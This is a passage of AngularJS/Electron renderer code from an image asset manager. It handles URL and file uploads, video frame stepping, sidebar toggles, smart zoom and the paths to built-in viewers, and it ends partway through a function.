        $scope.uploadUrl = function(url, folder, params) {
            if (url.indexOf("blob:") > -1) {
                swal({
                    html: `
                        <div class="alert">
                            <div class="alert-icon error"></div>
                            <h4 class="alert-title">${i18n.__("dialog.blob.title")}</h4>
                            <p class="alert-desc">${i18n.__("dialog.blob.desc")}</p>
                        </div>
                    `,
                    showCloseButton: false, showCancelButton: false, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                    width: 400,
                    customClass: "alert-box",
                    cancelButtonColor: "#777777",
                    confirmButtonText: i18n.__("general.ok"),
                }).then(function () {});
                return;
            }
            var folders = folder && [folder.id] || [];
            var tags = folder && folder.extendTags || [];

            $scope.uploadQueue.push({});
            $.ajax({
                type: "HEAD",
                url : url,
                timeout: 10000,
                complete: function(xhr, textStatus) {
                    let contentType = xhr.getResponseHeader('Content-Type') || "";
                    if (xhr.status === 403 || contentType.indexOf("image") > -1 ) {
                        IPCHelper.send('upload-url', {
                            url: url,
                            folders: folders,
                            tags: tags,
                            name: params && params.name || (getFilenameFromUrl(url) || guid()),
                            website: params && params.url || ""
                        });
                    }
                    // 添加書籤
                    else if (contentType.indexOf("html") > -1) {
                        var data = {
                            id: guid(),
                            url: url,
                            tags: tags || [],
                            modificationTime: Date.now(),
                            folders: folders,
                        };
                        ipcRenderer.sendTo(backgroundWindowID, 'url-from-extension', data);
                    }
                    else {
                        ipcRenderer.send("file-uploaded-end", {});
                    }
                } 
            });
        };

        $scope.uploadUrls = function(urls, fds, params) {
            var folders = [];
            let extendTags = [];

            if (fds && fds.length > 0) {
                folders = fds.map(function (fd) {
                    return $scope.folderMappings[fd];
                });
            }

            folders.forEach((folder) => {
                if (folder?.extendTags) {
                    folder.extendTags.forEach((tag) => {
                        extendTags.push(tag);
                    });
                }
            });

            extendTags = [...new Set(extendTags)];

            var files = urls.map(function(url, index) {
                
				let fileName = params && params.names && params.names[index] || "";
                let newTags = params?.tags;
                let tags = [];
                if (newTags && newTags.length > 0) {
                    tags = [...extendTags, ...newTags];
                }
                else if (extendTags.length > 0){
                    tags = [...extendTags];
                }
                console.log(`before: ${fileName.length}`)
                fileName = fileName.substr(0, remainingFilenameLength($scope.libraryPath));
                console.log(`after: ${fileName.length}`)

				fileName = sanitize(fileName).replace(/%/g, "").replace(/&lt;/g,"").replace(/&gt;/g,"").trim();
                return {
                    id: params?.ids && params?.ids[index] || undefined,
                    url: url,
                    folders: fds || [],
                    tags: tags,
                    type: params && params.types && params.types[index] || undefined,
                    name: fileName || undefined,
                    annotation: (params && params.annotations && params.annotations[index]) || "",
                    star: (params && params.stars && params.stars[index]) || undefined,
                    website: params && params.urls && params.urls[index] || "",
                    headers: params && params.headers && params.headers[index] || undefined,
                    modificationTime: (params && params.modificationTimes && params.modificationTimes[index]) || Date.now() + index
                }
            });
            if (files.length > 0) {
                $scope.showUploadQueue();
            }
            ipcRenderer.send('upload-urls', files);
        };

        $scope.uploadFiles = function($files, folder) {

            if ($files.length === 0) {
                $scope.hideUploadQueue();
                return;
            }

            console.log("$scope.uploadFiles");
            console.time("添加圖片耗費時間");

            var images = [];

            console.time("$scope.uploadFiles.初始化");
            let now = Date.now();
            for (let index = 0; index < $files.length; index++) {
                const file = $files[index];
                var fileName = file.name || path.basename(file.path);
                fileName = fileName.replace(path.extname(file.path), "").replace(/%/g, "").replace(emojiRegex, '');
                var image = {
                    id: file.id || guid(),
                    name: fileName,
                    path: file.path,
                    type: file.type,
                    size: file.size,
                    tags: file.tags || [],
                    url: file.url || "",
                    annotation: file.annotation || "",
                    lastModified: file.lastModified,
                    modificationTime: file.modificationTime || (now + index),
                    folders: file.folders || [],
                    star: file.star || undefined,
                };

                if (file.merged) image.merged = true;

                images.push(image);

                if (folder) {
                    image.folders.push(folder.id);
                    image.folders = [...new Set(image.folders)];
                    if (image.tags && folder.extendTags) {
                        folder.extendTags.forEach(function (tag) {
                            image.tags.push(tag);
                        });
                        image.tags = [...new Set(image.tags)];
                    }
                    else {
                        image.tags = folder.extendTags || image.tags || [];
                    }
                }

                $scope.uploadQueue.push(image);
            }
            console.timeEnd("$scope.uploadFiles.初始化");
            console.time("$scope.uploadFiles.ipcRenderer.send");
            IPCHelper.send('upload-local-files', {
                files: images.reverse()
            });

            console.timeEnd("$scope.uploadFiles.ipcRenderer.send");
            $("#upload-queue-progress").find(".message .percentage").html($scope.finishQueue.length + "/" + $scope.uploadQueue.length);
            $("#upload-queue-progress").find(".current").width($scope.finishQueue.length/$scope.uploadQueue.length*100 + "%");
        };

        $scope.fileDragOverClass = function() {
            if (!dragging) {
                return "drag-accept";
            }
            return "";
        };

        $scope.closeWindowHandler = function($event) {
            if ($scope.isPreviewing) {
                if (process.platform == 'darwin') {
                    event && event.stopPropagation();
                    event && event.preventDefault();
                    IPCHelper.send('quicklook', $scope.selected[0]);
                    $scope.isPreviewing = false;
                }
            }
        }

		$scope.nextFrame = (evnet) => {
			event.preventDefault();
			$scope.nextFrameHandler(1);
		};

		$scope.next10Frame = (evnet) => {
			event.preventDefault();
			$scope.nextFrameHandler(10);
		};

		$scope.prevFrame = (evnet) => {
			event.preventDefault();
			$scope.prevFrameHandler(1);
		};

		$scope.prev10Frame = (evnet) => {
			event.preventDefault();
			$scope.prevFrameHandler(10);
		};

        $scope.nextFrameHandler = throttle(function(amount = 1) {
        	event && event.preventDefault();
        	if ($scope.isDetailMode) {
        		if ($scope.current.ext === "gif") {
	        		$scope.nextGifFrame(amount);
	        	}
                else if (VIDEO_TYPES[$scope.current.ext] || AUDIO_TYPES[$scope.current.ext]) {
	        		var video = $(".detail-wrap video")[0];
                    if (video) { 
                        let step = video.frameTime || 0.04166667;
                        video.currentTime += step * amount;
                    }
	        	}
        	}
        }, 100, true);

        $scope.prevFrameHandler = throttle(function(amount = 1) {
        	event && event.preventDefault();
        	if ($scope.isDetailMode) {
        		if ($scope.current.ext === "gif") {
	        		$scope.prevGifFrame(amount);
	        	}
	        	else if (VIDEO_TYPES[$scope.current.ext] || AUDIO_TYPES[$scope.current.ext]) {
	        		var video = $(".detail-wrap video")[0];
                    if (video) { 
                        let step = video.frameTime || 0.04166667;
                        video.currentTime -= step * amount;
                    }
	        	}
        	}
        }, 100, true);

        $scope.nHandler = function($event) {
        	if (!$scope.isDetailMode) {
        		return;
        	}
            if (VIDEO_TYPES[$scope.current.ext] || AUDIO_TYPES[$scope.current.ext]) {
                var video = $(".detail-wrap video")[0];
                if (video) { 
                    $scope.addVideoComment($scope.current, video);
                }
            }
        }

        $scope.mHandler = function($event) {
            if (!$scope.isDetailMode) {
                return;
            }
            if (VIDEO_TYPES[$scope.current.ext] || AUDIO_TYPES[$scope.current.ext]) {
                $(".vjs-mute-control").click();
            }
        }

        $scope.flipHandler = function ($event) {
        	if (VIDEO_TYPES[$scope.current.ext] || AUDIO_TYPES[$scope.current.ext]) {
        		$scope.flipVideo($event, $scope.current);
        	}
        	else {
        		$scope.flipImage($event, $scope.current);
        	}
        }

        $scope.rotateHandler = function ($event) {
        	if (VIDEO_TYPES[$scope.current.ext] || AUDIO_TYPES[$scope.current.ext]) {
        		$scope.rotateVideo($event, $scope.current);
        	}
        	else {
        		$scope.rotateImage($event, $scope.current);
        	}
        }

        $scope.escHandler = function($event) {
            if ($(".swal2-container").length > 0) return;
            $scope.selectedFolder = undefined;
            if ($scope.isSlideshowMode) {
                $scope.isSlideshowMode = false;
                ipcRenderer.send("leave-slideshow");
                return;
            }
            if (!$scope.isDetailMode) {
                if (document.activeElement?.tagName !== "INPUT") {
                    $scope.cleanSelected($event);
                }
            } 
            else {
                if ($scope.isCropMode) {
                    $scope.isCropMode = false;
                }
                else if (AnnotationPreview.isShow) {
                	AnnotationPreview.hide();
                }
                else {
                    $scope.leaveDetailMode();
                }
            }
            if ($scope.isPreviewing) {
                if (process.platform == 'darwin') {
                    ipcRenderer.send('quicklook', $scope.selected[0]);
                    $scope.isPreviewing = false;
                }
                return;
            }
        };

        $scope.back = function() {
            if (!$scope.isDetailMode) {
                $scope.prevHistory();
            }
            else {
                $scope.leaveDetailMode();
            }
        };

        $scope.toggleFilter = function () {
            eagle.filter.isOpen = !eagle.filter.isOpen;
            if (!eagle.filter.isOpen) {
                $("[filter-item].open").removeClass("open");
            }
            $scope.updateContainerHieght(true);
            if (eagle.filter.isOpen) { electronLog && electronLog.info("[app] Filter: ON"); }
            else { 
                electronLog && electronLog.info("[app] Filter: OFF"); 
            }
        };

        $scope.toggleSubFolderList = function() {
            $scope.isHideSubFolder = !$scope.isHideSubFolder;
            localStorage.setItem("isHideSubFolder", $scope.isHideSubFolder);
        };

        $scope.toggleMainNav = function() {
            if (!$scope.isHideMainNav && $scope.isOpenWebpagePanel) return;
            $scope.isHideMainNav = !$scope.isHideMainNav;
            localStorage.setItem("isHideMainNav", $scope.isHideMainNav);
            if ($scope.isHideMainNav) { electronLog && electronLog.info("[app] Activity bar: OFF"); }
            else { electronLog && electronLog.info("[app] Activity bar: ON"); }
        };

        $scope.toggleSidebar = function() {
            $scope.isHideSidebar = !$scope.isHideSidebar;
            $timeout(function() {
            	$scope.lastItemStates = {};
                $(window).trigger("orientationchange");
                $scope.boxContianerWidth = $("#box-container").width() || $scope.boxContianerWidth;
                $scope.boxContianerHeight = $("#box-container").height() || $scope.boxContianerHeight;                
                $scope.relayout();
                $scope.offsetScrollbar(30);
                if ($scope.isDetailMode && $scope.lastZoomMode === "edge") {
                    $scope.zoomFitEdge(event);
                }
                if (
                    ($scope.layout === "GridLayout" || $scope.layout === "SquareLayout") && 
                    ig._layout
                ) { 
                    var currentColumn = ig._layout._columnLength;
                    var currentWidth = $scope.imageSize.height;
                    var targetColumn = Math.floor($scope.boxContianerWidth / currentWidth);
                    $scope.adjustLayoutWidth(targetColumn - currentColumn); 
                }
            }, 100);
            localStorage.setItem("isHideSidebar", $scope.isHideSidebar);
            if ($scope.isHideSidebar) { electronLog && electronLog.info("[app] Sidebar: OFF"); }
            else { electronLog && electronLog.info("[app] Slidebar: ON"); }
        };

        $scope.whenLayoutChange = () => {
            $scope.lastItemStates = {};
            $(window).trigger("orientationchange");
            $scope.boxContianerWidth = $("#box-container").width() || $scope.boxContianerWidth;
            $scope.boxContianerHeight = $("#box-container").height() || $scope.boxContianerHeight;
            $scope.relayout();
            $scope.offsetScrollbar(30);
            if ($scope.isDetailMode && $scope.lastZoomMode === "edge") {
                $scope.zoomFitEdge(event);
            }
            if ($scope.layout === "GridLayout" || $scope.layout === "SquareLayout") { 
                var currentColumn = ig._layout._columnLength;
                var currentWidth = $scope.imageSize.height;
                var targetColumn = Math.floor($scope.boxContianerWidth / currentWidth);
                $scope.adjustLayoutWidth(targetColumn - currentColumn); 
            }
        };

        $scope.toggleAll = function($event) {
            if ($event) {
                $event.preventDefault();
                $event.stopPropagation();
            }
            if ($scope.isHideSidebar) {
                eagle.inspector.isHideInspector = $scope.isHideSidebar = false;
            } else {
                eagle.inspector.isHideInspector = $scope.isHideSidebar = true;
            }
            $timeout(function() {
                $scope.lastItemStates = {};
                $(window).trigger("orientationchange");
                $scope.boxContianerWidth = $("#box-container").width() || $scope.boxContianerWidth;
                $scope.boxContianerHeight = $("#box-container").height() || $scope.boxContianerHeight;
                $scope.relayout();
                $scope.offsetScrollbar(30);
                if ($scope.isDetailMode) {
                	$rootScope.currentFocus = "content";
                }
                if ($scope.isDetailMode && $scope.lastZoomMode === "edge") {
                    $scope.zoomFitEdge(event);
                }
                if ($scope.layout === "GridLayout" || $scope.layout === "SquareLayout") { 
                    var currentColumn = ig._layout._columnLength;
                    var currentWidth = $scope.imageSize.height;
                    var targetColumn = Math.floor($scope.boxContianerWidth / currentWidth);
                    $scope.adjustLayoutWidth(targetColumn - currentColumn); 
                }
            }, 100);
            localStorage.setItem("isHideSidebar", $scope.isHideSidebar);
            if ($scope.isHideSidebar) { electronLog && electronLog.info("[app] Sidebar: OFF"); }
            else { electronLog && electronLog.info("[app] Sidebar: ON"); }
            if (eagle.inspector.isHideInspector) { electronLog && electronLog.info("[app] Sidebar: OFF"); }
            else { electronLog && electronLog.info("[app] Sidebar: ON"); }
        };

        $scope.toggleDetailMode = function($event, isInline) {
            if ($(".swal2-container").length > 0) return;
            if ($scope.isCropMode) {
                $scope.saveCrop();
                return;
            }
            if (isInline !== undefined) {
                $scope.isInlineMode = !!isInline;
                if ($scope.isInlineMode) {
                    $scope.isCommentMode = false;
                }
            }
            if ($rootScope.currentFocus == "sidebar" || $rootScope.currentFocus == "tags") {
                $scope.renameCurrentFolder($event);
            } 
            else {
                if ($scope.selectedFolderMappings && Object.keys($scope.selectedFolderMappings).length >= 1) {
                    var folderId = Object.keys($scope.selectedFolderMappings)[0];
                    if ($scope.folderMappings[folderId]) {
                        $scope.openFolder($scope.folderMappings[folderId]);
                    }
                }
                else {
                    if ($scope.isDetailMode) {
                        $scope.leaveDetailMode($event)
                    } 
                    else {
                        $scope.enterDetailMode($event, null);
                    }
                }
            }
        };

        $scope.rememberScrollTops = function(item) {
            if ($scope.isInlineMode) return;
            if ($scope.lastZoomMode === "edge") return;
            if (item && item.id) {
                $scope.lastItemStates[item.id] = {
                    data: $("#detail-container").smoothZoom('getChangedData')
                }
            }
        };

        var scrollTimeout;
        $scope.updateScrollTop = function(item) {
            var state = $scope.lastItemStates[item.id];
            clearTimeout(scrollTimeout);
            if (state && typeof state.scrollTop === "number") {
                scrollTimeout = $timeout(function() {
                    $("#detail-container").scrollTop(state.scrollTop)
                }, 200);
            }
        };

        function isMobileResolution(w, h) {
        	if (w === h) return false;
            for (var i = 0; i < devicesMetrics.length; i++) {

                var size = devicesMetrics[i];
                var remainderW = w % size.w;
                var remainderH = h % size.h;
                var multipleW = w / size.w;
                var multipleH = h / size.h;

                if (remainderW == 0 && remainderH == 0 && multipleW === multipleH) {
                    if (w / size.w <= 3) {
                        return size.h;
                    }
                }
            }
            return false;
        }

        function getImagePixelDensity(image) {
            if (image && image.name) {
                if (image.name.endsWith("@2x")) {
                    return 50;
                }
                else if (image.name.endsWith("@3x")) {
                    return 33.33;
                }
                else if (image.name.endsWith("@1.5x")) {
                    return 66.66;
                }
                else if (image.name.endsWith("@0.5x")) {
                    return 200;
                }
            }
            return 100;
        }

        function isMobileWidth(w) {
            if (w % 375 === 0 && w <= 1125) { return 375; }
            return false;
        }

        $scope.getRawPath = function (image) {
            if (!image || !$scope.imagesDir) return;
            if (!$scope.modifiedMappings[image.id]) {
                return "file://" +  getRawPath($scope.imagesDir, image);
            }
            else {
                return "file://" +  getRawPath($scope.imagesDir, image) + "?v=" + $scope.modifiedMappings[image.id];
            }
        };

        $scope.getLastestThumbnailPath = function (image) {
        	return FileUrlHelper.getLastestThumbnailUrl(image);
        };

		$scope.getRawUrl = function (image) {
            if (!$scope.imagesDir || !image) return;
            let rawUrl = FileUrlHelper.getRawUrl(image);
            if (!EagleConfig.SUPPORT_FORMATS[image.ext]) {
                rawUrl = FileUrlHelper.getThumbnailUrl(image);
            }
            if ($bodyScope.modifiedMappings && $bodyScope.modifiedMappings[image.id]) {
	            rawUrl = `${rawUrl}?v=${$bodyScope.modifiedMappings[image.id]}`;
	        }
        	return rawUrl;
        };

        $scope.getThumbnailUrl = function (image) {
            if (!$scope.imagesDir || !image) return;
            return FileUrlHelper.getThumbnailUrl(image);
        };

        $scope.getThumbnailPath = function (image) {
            if (!$scope.imagesDir || !image) return;
            return FileUrlHelper.getThumbnailUrl(image);
        };

        ipcRenderer.on('update-txt-item', function(e, params) {
        	var item = $scope.itemMappings[params.id];
        	if (item) {
        		item.text = params.text;
        		$scope.updateTxtItem(item);
        		$scope.$evalAsync();
        	}
        });

        // 避免更新
        ipcRenderer.on('thumbnail-generated', function(e, generated) {
            if (!generated || !generated.id || !$scope.selected || !$scope.selected[0]) return;
            if ($scope.selected && $scope.selected[0] && generated.id === $scope.selected[0].id) {
                const $detailImage = $("img#detail-image");
                if ($detailImage.length) {
                    const rawURL = $scope.getRawUrl(generated);
                    $detailImage.css({
                        "transform": `rotate(0deg)`,
                        "transition": "none",
                        "display": "none"
                    });
                    const temp = new Image();
                    temp.onload = function() {
                        $detailImage.attr("src", rawURL);
                        $("#detail-container").smoothZoom('updateNavigator', generated);
                        $detailImage.data("degree", 0);
                        $scope.forceFitImageSize(generated);
                        $detailImage.css({
                            "display": "block"
                        });
                    };
                    temp.src = rawURL;
                }
            }
        });

        $scope.lastZoom = function () {
            if ($scope.lastZoomMode === "edge") return false;
            if ($rootScope.preferences.habits.rememberLastZoom === "off") return false;
            if (!$scope.current) return false;
            if ($scope.isInlineMode) return false;
            var state = $scope.lastItemStates[$scope.current.id];
            if (state && state.data && state.data.tX !== undefined) {
                $("#detail-container").smoothZoom('goTo', state.data.tX, state.data.tY, state.data.rA);
                var ratio = parseInt(state.data.rA * 100);
                $scope.imageSize.zoomRatio = $scope.getRatioNonExp(ratio);
                $scope.imageSize.zoomRatioExp = ratio;
                return true;
            }
            return false;
        };

        $scope.zoom = function () {
            if (!$scope.isDetailMode) return;
            if ($scope.lastZoomMode === "edge") {
                if ($scope.current && !$scope.VIDEO_TYPES[$scope.current.ext]) {
                    $scope.zoomFitEdge();
                }
                else {
                    $scope.zoomFit();
                }
            }
            else {
                $scope.smartZoom();
            }
        }

        // 計算出與當前屏幕尺寸最適合的呈現方式
        var detailImageTimeout;
        $scope.smartZoom = function(target, forceMode) {
            var current = target || $scope.current;
            var ratio = $scope.imageSize.zoomRatio || 100;
            var lastRatio = ratio;
            var $container = $(".content-panel");
            var toolbarHeight = 0;
            var containerWidth;
            var containerHeight;
            var offsetY = 0;

            if ($scope.isSlideshowMode) {
                toolbarHeight = 0;
                containerWidth = $(window).width();
                containerHeight = $(window).height() - toolbarHeight;
            }
            else if ($scope.isInlineMode) {
                toolbarHeight = 96;
                containerWidth = $(window).width();
                containerHeight = $container.height() - toolbarHeight;
            }
            else {
                toolbarHeight = 48;
                containerWidth = $container.width();
                containerHeight = $container.height() - toolbarHeight;
            }

            if (!current) return;

            $("#detail-image").css({
                "transform": `rotate(0deg)`,
                "transition": "none"
            });

            // 不使用智能縮放
            if ($rootScope.preferences.habits.defaultRatio != "auto" && !forceMode) {
                ratio = 100;
                offsetY = toolbarHeight/2 * 100 / ratio;
            }
            // 使用智能縮放
            else {
                if (
                	(current.width >= 960 && current.width * 1.8 < current.height) ||
                	(current.width >= 320 && current.width * 2.7 < current.height)
            	) {
                    ratio = parseInt((containerWidth - 0) / current.width * 100);
                    if (ratio > 100) {
                        ratio = 100;
                    }
                    if (current.height > $container.height()) {
                        offsetY = toolbarHeight/2 * 100 / ratio;
                        offsetY += (current.height - containerHeight * 100 / ratio) / -2;
                    }
                    else {
                        offsetY = toolbarHeight/2 * 100 / ratio;
                    }
                } 
                else {
					if (current.height + toolbarHeight / 2 > containerHeight || current.width + toolbarHeight / 2 > containerWidth) {
						var a = parseInt((containerHeight) / current.height * 100);
						var b = parseInt((containerWidth) / current.width * 100);
						ratio = Math.min(a, b);
					}
					else {
						ratio = 100;
					}
					offsetY = toolbarHeight/2 * 100 / ratio;
                }

                // 如果是手机尺寸并且尺寸符合画面大小
                if (getImagePixelDensity(current) !== 100) {
                    var mr = getImagePixelDensity(current);
                    var largeThanCotainer = current.width * mr / 100 > containerWidth || current.height * mr / 100 > containerHeight;
                    if (!largeThanCotainer) {
                        ratio = mr;
                        offsetY = toolbarHeight/2 * 100 / ratio;
                    }
                    else {
                        var wr = mr / ((current.width * mr / 100) / containerWidth);
                        var hr = mr / ((current.height * mr / 100) / containerHeight);
                        ratio = Math.min(wr, hr);
                        offsetY = toolbarHeight/2 * 100 / ratio;
                    }
                }
                else if (isMobileResolution(current.width, current.height)) {
                    var mr = 100 * isMobileResolution(current.width, current.height) / current.height;
                    var largeThanCotainer = current.width * mr / 100 > containerWidth || current.height * mr / 100 > containerHeight;
                    if (!largeThanCotainer) {
                        ratio = mr;
                        offsetY = toolbarHeight/2 * 100 / ratio;
                    }
                    else {
                    	var wr = mr / ((current.width * mr / 100) / containerWidth);
                        var hr = mr / ((current.height * mr / 100) / containerHeight);
                        ratio = Math.min(wr, hr);
                        offsetY = toolbarHeight/2 * 100 / ratio;
                    }
                }
                else if (isMobileWidth(current.width) && current.width * 2.4 < current.height) {
                    ratio = isMobileWidth(current.width) / current.width * 100;
                    if (ratio > 100) {
                        ratio = 100;
                    }
                    if (current.height > $container.height()) {
                        offsetY = (current.height - $container.height() * 100 / ratio) / -2;
                        offsetY = toolbarHeight/2 * 100 / ratio;
                    }
                }
            }

            var $detailContainer = $("#detail-container");
            var width = $detailContainer.width();
            var height = current && current.height || $detailContainer.height();

        	offsetY = offsetY || 0;

            if (ratio) {
                $scope.imageSize.zoomRatio = $scope.getRatioNonExp(ratio);
                $scope.imageSize.zoomRatioExp = $scope.getRatioExp($scope.imageSize.zoomRatio);
            }
            $scope.showLargeImage = true;
            $detailContainer.smoothZoom('focusTo', {
                x: width / 2,
                y: height / 2 + offsetY,
                zoom: $scope.imageSize.zoomRatio,
                speed: 0
            });
        };

        $scope.getRatioExp = function (ratio) {
            if (ratio > 100) {
                ratio = 100 + (ratio - 100) * 7;
            }
            return parseInt(ratio);
        };

        $scope.getRatioNonExp = function (ratio) {
            if (ratio > 100) {
                ratio = (ratio - 100) / 7 + 100;
            }
            return ratio;
        };

        $scope.updateListSlider = function (size) {
        
        };

        $("body").on("input", "#detail-slider-ratio", function () {
            let ratio = parseInt($(this).val());
            $scope.updateZoomRatio(ratio);
            $scope.$evalAsync();
        });

        var zoomHintTimeout;
        var updateZoomRatioTimeout;
        $scope.updateZoomRatio = function(ratio, x, y, hasTransition) {
            var pageX, pageY;

            if (ratio) {
                $scope.imageSize.zoomRatio = ratio;
                $scope.imageSize.zoomRatioExp = $scope.getRatioExp($scope.imageSize.zoomRatio);
            }

            if ($.isNumeric(x) && $.isNumeric(y)) {
                pageX = x;
                pageY = y;
            } else {
                pageX = $(window).width() / 2;
                pageY = $(window).height() / 2;
            }

            if (hasTransition) {
                clearTimeout(updateZoomRatioTimeout);
                $("#detail-container").addClass("zooming");
                updateZoomRatioTimeout = setTimeout(function () {
                    $("#detail-container").removeClass("zooming");
                }, 300);
            }
            
            $("#detail-container").smoothZoom('focusTo', {
                zoom: $scope.imageSize.zoomRatioExp,
                pageX: pageX,
                pageY: pageY,
                speed: 0
            });
        };

        $scope.getModelPath = function() {
            if ($scope.current) {
                var rawUrl = FileUrlHelper.getRawUrl($scope.current);
				rawUrl = rawUrl.replaceAll(',', '%2C');
                var type = $scope.current.ext;
				return `model-viewer/website/index.html#model=${rawUrl}`;
            }
        };

        $scope.getPDFPath = function() {
            if ($scope.current) {
            	var pdfPath = FileUrlHelper.getRawUrl($scope.current);
                var locale = preferences.general.language.replace("_", "-");
                return `pdf-viewer/web/viewer.html?path=${encodeURIComponent(pdfPath)}&locale=${locale}&theme=${$scope.theme}`;
            }
        };

        $scope.getGIFPath = function() {
            if ($scope.current) {
                var gifPath = FileUrlHelper.getRawPath($scope.current);
                var gifUrl = FileUrlHelper.getRawUrl($scope.current);
                var renderBehavior = $rootScope.preferences.habits.renderBehavior;
                return "gif-viewer/index.html?path=" + encodeURIComponent(gifPath) + "&url=" + encodeURIComponent(gifUrl) + "&name=" + encodeURIComponent($scope.current.name + ".gif") + `&render=${renderBehavior}`;
            }
        };

        $scope.getNativeViewerPath = function() {
            if ($scope.current) {
                var filePath = $scope.imagesDir + $scope.current.id + ".info/";
                return "native-viewer/index.html?path=" + encodeURIComponent(filePath) + "&name=" + encodeURIComponent($scope.current.name + "." + $scope.current.ext) + "&ext=" + $scope.current.ext + "&width=" + $scope.current.width + "&height=" + $scope.current.height + "&id=" + $scope.current.id;
            }
        };

        $scope.getURLSrc = function () {
            let item = $scope.current;
        	if (item.ext === "url") {
        		var embed;
        		if (item.medium === "youtube") {
        			embed = `https://www.youtube-nocookie.com/embed/${item.videoID}?autoplay=1&vq=hq1080`;
        		}
        		else if (item.medium === "vimeo") {
        			embed = `https://player.vimeo.com/video/${item.videoID}?autoplay=1`;
        		}
        		else {
        			embed = item.url;
        		}
        		return embed;
        	}
            else {
                return FileUrlHelper.getRawUrl($scope.current);
            }
        }

        $scope.getRawViewerPath = function() {
            if ($scope.current) {
                var image = $scope.current;
                var rawPath = $scope.imagesDir + $scope.current.id + ".info/";
                return `./raw-viewer/index.html?orientation=${image.orientation}&path=${encodeURIComponent(rawPath)}&name=${encodeURIComponent(image.name)}&ext=${image.ext}&width=${image.width}&height=${image.height}`;
            }
        };

        $scope.getFontPath = function() {
            if ($scope.current) {
                return `./font-viewer/font-viewer.html?id=${$scope.current.id}&theme=${$scope.theme}&language=${$scope.language}`;
            }
        };

        $scope.getTxtPath = function() {
            if ($scope.current) {
                return `./text-editor/text-editor.html?id=${$scope.current.id}&theme=${$scope.theme}&name=${$scope.current.name}&language=${$scope.language}`;
            }
        };

        $scope.getExifPath = function (image) {
            if (image) {
                return `./exif-viewer/index.html?orientation=${image.orientation}&path=${encodeURIComponent(FileUrlHelper.getLastestThumbnailUrl(image))}&width=${image.width}&height=${image.height}`;
            }
        };

        $scope.getExifRawPath = function () {
            if ($scope.current) {
                return `./exif-viewer/index.html?orientation=${$scope.current.orientation}&path=${encodeURIComponent(FileUrlHelper.getRawUrl($scope.current))}&width=${$scope.current.width}&height=${$scope.current.height}&zoom=${$rootScope.preferences.habits.renderBehavior}`;
            }
        };

        $(window).blur(function () {
            if (dragging) return;
            $scope.$evalAsync();
            $("body").addClass("window-blur");
            HoverPreviewKeydown = false;
        });

        $(window).focus(function () {
            $("body").removeClass("window-blur");
        });

        currentWindow.on('restore', () => {
            $scope.showImages();
        });

        currentWindow.on('close', () => {
            if ($scope.isDetailMode) {
                var video = $(".detail-wrap video")[0];
                if (video && !video.paused) { video.pause(); }
            }
        });

        $(window).on('mousedown', event => {
            switch (event.button) {
				case 3: 
					if ($scope.isDetailMode) {
	                    $scope.selectNext();
	                }
	                else {
	                    $scope.prevHistory();
	                }
	                $scope.$evalAsync();
					break;
				case 4: 
					if ($scope.isDetailMode) {
	                    $scope.selectPrev();
	                }
	                else {
	                    $scope.nextHistory();
	                }
	                $scope.$evalAsync();
					break;
			}
        });
        
        $(window).on("keypress", function(event) {
            if ($(":focus").length > 0) { return; }
        })

        $(window).on("keydown", function(event) {
            // 如果是标注模式，点击空格键应该可以暂时切换回拖拽模式，放开后回到正常模式
            if ($(":focus").length > 0) { return; }
            if (event.keyCode === 32 && $scope.isCommentMode && !$scope.tempDragMode) {
                $scope.tempDragMode = true;
                $scope.isCommentMode = false;
                $scope.$evalAsync();
            }
        })

        $(window).on("keyup", function(event) {
            if ($scope.tempDragMode && !$scope.isCommentMode) {
                $scope.tempDragMode = false;
                $scope.isCommentMode = true;
                $scope.$evalAsync();
            }
        })

        // 中鍵點擊進入全螢幕
        $scope.onDetailClick = function($event, image) {
            if ($event.which == 2) {
                ipcRenderer.send('toggle-slideshow');
            }
        };


        $scope.initDetailMode = false;
        var zoomInitTimeout;
        $scope.enterDetailMode = function($event, image) {
        	$("#detail-container").css("opacity", 0);

            var duration = 100;
            if ($scope.isInlineMode) {
                duration = 50;
            }

            if ($scope.selected.length <= 0) return;
            var image = image || $scope.selected[$scope.selected.length - 1];
            $scope.isDetailMode = true;
            $scope.current = image;
            $scope.selected = [image];
            $scope.showDetailImage = true;
            $scope.zoom(image);
            eagle.inspector.activeTab = "ITEM";
            $scope.smoothZoomDone = false;

            $timeout.cancel(zoomInitTimeout);
            zoomInitTimeout = $timeout(function() {
                if (!$scope.initDetailMode) {
                    $scope.initDetailMode = true;
                    $("#detail-container").smoothZoom({
                        width: '100%',
                        height: '100%',
                        responsive: true,
                        mouse_WHEEL: true,
                        mouse_DOUBLE_CLICK: false,
                        zoom_BUTTONS_SHOW: false,
                        pan_BUTTONS_SHOW: false,
                        background_COLOR: 'transparent',
                        border_SIZE: 0,
                        animation_SMOOTHNESS: 0,
                        animation_SPEED_ZOOM: 0,
                        animation_SPEED_PAN: 0,
                        zoom_MAX: 800,
                        zoom_MIN: 5,
                        on_IMAGE_LOAD: function() {
                            $timeout(function() {
                                $(window).trigger("orientationchange");
                                $scope.showDetailImage = true;
                                $scope.smoothZoomDone = true;
                                if (!$scope.lastZoom()) {
                                    $scope.zoom(image);
                                }
                                $("#detail-container").smoothZoom('updateNavigator', $bodyScope.current);

                                $("#detail-container").css("opacity", 1);
                                $(".smooth_zoom_preloader").show();

                                // 如果用户没有设置过 mousewheel 偏好
                                if (!$rootScope.preferences.habits.scrollBehaviorTour) {
                                    $(".smooth_zoom_preloader").one("mousewheel.tour", function () {
                                        $rootScope.$broadcast("OPEN_MOUSEWHEEL_PREFERENCE_WINDOW");
                                    });
                                }
                            }, 100);
                        }
                    });
                } else {
                    $scope.smoothZoomDone = true;
                    $("#detail-container").smoothZoom('updateNavigator', $bodyScope.current);
                    $(window).trigger("orientationchange");
                    if (!$scope.lastZoom()) {
                        $scope.zoom(image);
                    }
                    $("#detail-container").css("opacity", 1);
                    setTimeout(function() {
                        $scope.preloadImage("next");
                    }, 200);
                }
                $scope.addToRecentFile($scope.current);
                removePlayingAudios();
            	HoverPreview.hide();
            }, duration);
        };

        $scope.dblclickContentPanel = function () {
            if (!$scope.isCropMode) {
                $scope.leaveDetailMode();
            }    
        };

        $scope.fadeOutDetailMode = function () {
        	var $box = $(".box.selected").eq(0);
        	$box.addClass("popdown");
        	setTimeout(function () {
        		$box.removeClass("popdown");
        	}, 100);
        };


        $scope.leaveDetailMode = function() {

            $scope.isCropMode = false;
            $scope.usingGifPlayer = false;

            if ($scope.isDetailMode) {
                
                $scope.rememberScrollTops($scope.current);

                $scope.isDetailMode = false;
                $scope.showDetailImage = false;
                $scope.smoothZoomDone = false;
